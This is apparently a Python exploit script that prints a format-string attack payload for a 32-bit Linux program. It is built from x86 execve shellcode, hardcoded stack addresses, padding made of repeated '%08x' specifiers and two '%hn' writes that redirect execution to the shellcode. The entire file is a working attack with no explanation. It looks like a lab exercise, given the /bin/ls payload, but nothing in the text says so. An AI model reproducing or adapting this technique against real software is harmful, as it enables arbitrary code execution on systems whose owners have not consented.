import sys
import os

SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"

ADDRESSTOWRITE = b'BFFFE58C'
                 #8C E5 FF BF
ADDRESSOFSHELL = b'BFFFEA9D'
                #9D EA FF BF
                #69 EF FF BF

ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(4, 'little')
ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X2
ADDRESSTOWRITE2 = ADDRESSTOWRITE2.to_bytes(4, 'little')

ADDRESSOFSTRING = b'BFFFEA58'
ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(4, 'little'))
LENTGHOFREQUIRED = 61

#print("AAAA" + str(ADDRESSTOWRITE1)[2:18] + str(ADDRESSTOWRITE2)[2:18] +  "%08x." * 320)
with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%24579x' + b'%hn' + b'%38352x' +  b'%hn' + SHELLCODE + b'\n')